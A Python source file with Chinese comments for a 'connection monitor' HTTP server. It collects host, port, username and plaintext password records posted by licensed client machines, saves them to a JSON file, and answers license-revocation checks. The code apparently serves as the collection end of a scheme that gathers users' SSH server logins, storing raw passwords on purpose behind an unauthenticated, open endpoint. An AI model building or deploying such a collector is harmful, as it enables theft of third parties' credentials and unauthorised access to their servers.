#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
连接监控服务器
接收子机发送的连接信息并保存
"""

import json
import os
import threading
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import base64
from license_manager import LicenseManager


def get_app_dir():
    """获取应用程序目录（兼容打包后的exe和开发环境）"""
    import sys
    if getattr(sys, 'frozen', False):
        return os.path.dirname(os.path.abspath(sys.executable))
    else:
        return os.path.dirname(os.path.abspath(__file__))


class ConnectionMonitor:
    """连接监控器"""
    
    def __init__(self, port=8888):
        self.port = port
        self.server = None
        self.server_thread = None
        self.connections_file = os.path.join(get_app_dir(), "user_connections.json")
        self.connections = []
        self.license_manager = LicenseManager()  # 用于检查授权码状态
        self.load_connections()
    
    def load_connections(self):
        """加载连接记录"""
        if os.path.exists(self.connections_file):
            try:
                with open(self.connections_file, 'r', encoding='utf-8') as f:
                    self.connections = json.load(f)
            except:
                self.connections = []
        else:
            self.connections = []
    
    def save_connections(self):
        """保存连接记录"""
        try:
            with open(self.connections_file, 'w', encoding='utf-8') as f:
                json.dump(self.connections, f, indent=2, ensure_ascii=False)
        except Exception as e:
            print(f"保存连接记录失败: {e}")
    
    def add_connection(self, host, port, username, password, machine_id=None, license_id=None, client_ip=None):
        """添加连接记录"""
        connection_record = {
            'host': host,
            'port': int(port),
            'username': username,
            'password': password,  # 保存原始密码
            'machine_id': machine_id or '',
            'license_id': license_id or '',
            'client_ip': client_ip or '',  # 子机IP地址
            'connect_time': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'timestamp': datetime.now().timestamp()
        }
        
        # 检查是否已存在相同的连接（相同IP、端口、用户名）
        exists = False
        for conn in self.connections:
            if (conn.get('host') == host and 
                conn.get('port') == int(port) and 
                conn.get('username') == username):
                # 更新现有记录
                conn.update(connection_record)
                exists = True
                break
        
        if not exists:
            self.connections.append(connection_record)
        
        self.save_connections()
        return connection_record
    
    def get_all_connections(self):
        """获取所有连接记录"""
        # 按连接时间倒序排列
        return sorted(self.connections, key=lambda x: x.get('timestamp', 0), reverse=True)
    
    def get_connections_by_license(self, license_id):
        """根据授权码ID获取连接记录"""
        return [conn for conn in self.connections if conn.get('license_id') == license_id]


class ConnectionMonitorHandler(BaseHTTPRequestHandler):
    """HTTP请求处理器"""
    
    def do_POST(self):
        """处理POST请求"""
        try:
            path = urlparse(self.path).path
            
            # 检查授权码状态
            if path == '/check_license':
                self.handle_check_license()
                return
            
            # 接收连接信息
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            
            # 解析JSON数据
            data = json.loads(post_data.decode('utf-8'))
            
            # 获取连接信息
            host = data.get('host', '')
            port = data.get('port', 22)
            username = data.get('username', '')
            password = data.get('password', '')
            machine_id = data.get('machine_id', '')
            license_id = data.get('license_id', '')
            client_ip = data.get('client_ip', '')  # 子机IP地址
            
            # 添加连接记录
            monitor = self.server.connection_monitor
            connection_record = monitor.add_connection(
                host, port, username, password, machine_id, license_id, client_ip
            )
            
            # 打印接收到的连接信息（用于调试）
            print(f"收到连接信息: {host}:{port} 用户:{username} 子机IP:{client_ip} 授权码ID:{license_id[:12] if license_id else 'N/A'}")
            
            # 返回成功响应
            response = {
                'status': 'success',
                'message': '连接信息已记录',
                'connect_time': connection_record['connect_time']
            }
            
            self.send_response(200)
            self.send_header('Content-type', 'application/json; charset=utf-8')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(json.dumps(response, ensure_ascii=False).encode('utf-8'))
            
        except Exception as e:
            # 返回错误响应
            import traceback
            error_detail = traceback.format_exc()
            print(f"接收连接信息错误: {e}\n{error_detail}")
            
            response = {
                'status': 'error',
                'message': str(e)
            }
            
            self.send_response(400)
            self.send_header('Content-type', 'application/json; charset=utf-8')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(json.dumps(response, ensure_ascii=False).encode('utf-8'))
    
    def handle_check_license(self):
        """处理检查授权码状态请求"""
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            if content_length > 0:
                post_data = self.rfile.read(content_length)
                data = json.loads(post_data.decode('utf-8'))
            else:
                # GET参数
                query_params = parse_qs(urlparse(self.path).query)
                data = {}
                if 'license_id' in query_params:
                    data['license_id'] = query_params['license_id'][0]
            
            license_id = data.get('license_id', '')
            
            if not license_id:
                response = {
                    'status': 'error',
                    'message': '缺少授权码ID',
                    'revoked': False
                }
            else:
                monitor = self.server.connection_monitor
                # 检查授权码状态
                licenses = monitor.license_manager.get_all_licenses()
                
                revoked = False
                for lic in licenses:
                    # 检查12位ID或完整ID
                    if (lic.get('display_id') == license_id or 
                        lic.get('id') == license_id or
                        lic.get('id', '')[:12] == license_id[:12]):
                        if lic.get('status') == 'revoked':
                            revoked = True
                        break
                
                response = {
                    'status': 'success',
                    'revoked': revoked,
                    'message': '授权码已停用' if revoked else '授权码有效'
                }
            
            self.send_response(200)
            self.send_header('Content-type', 'application/json; charset=utf-8')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(json.dumps(response, ensure_ascii=False).encode('utf-8'))
            
        except Exception as e:
            response = {
                'status': 'error',
                'message': str(e),
                'revoked': False
            }
            
            self.send_response(500)
            self.send_header('Content-type', 'application/json; charset=utf-8')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(json.dumps(response, ensure_ascii=False).encode('utf-8'))
    
    def do_GET(self):
        """处理GET请求"""
        path = urlparse(self.path).path
        
        # 检查授权码状态
        if path == '/check_license':
            self.handle_check_license()
            return
        
        # 默认响应
        self.send_response(200)
        self.send_header('Content-type', 'text/html; charset=utf-8')
        self.end_headers()
        html_content = '<h1>连接监控服务器运行中</h1>'
        self.wfile.write(html_content.encode('utf-8'))
    
    def log_message(self, format, *args):
        """日志输出（用于调试）"""
        # 只记录POST请求，不记录GET请求
        if args and len(args) > 0:
            message = args[0] if args else ""
            if "POST" in message:
                print(f"HTTP请求: {message}")


class ConnectionMonitorServer:
    """连接监控服务器"""
    
    def __init__(self, port=8888):
        self.port = port
        self.monitor = ConnectionMonitor(port)
        self.server = None
        self.server_thread = None
        self.is_running = False
    
    def start(self):
        """启动服务器"""
        if self.is_running:
            return
        
        try:
            self.server = HTTPServer(('0.0.0.0', self.port), ConnectionMonitorHandler)
            self.server.connection_monitor = self.monitor
            
            def run_server():
                self.is_running = True
                self.server.serve_forever()
            
            self.server_thread = threading.Thread(target=run_server, daemon=True)
            self.server_thread.start()
            print(f"连接监控服务器已启动，监听端口: {self.port}")
            return True
        except Exception as e:
            print(f"启动连接监控服务器失败: {e}")
            return False
    
    def stop(self):
        """停止服务器"""
        if self.server and self.is_running:
            self.server.shutdown()
            self.is_running = False
            print("连接监控服务器已停止")
    
    def get_monitor(self):
        """获取监控器实例"""
        return self.monitor


if __name__ == '__main__':
    # 测试服务器
    server = ConnectionMonitorServer(8888)
    server.start()
    
    try:
        import time
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        server.stop()

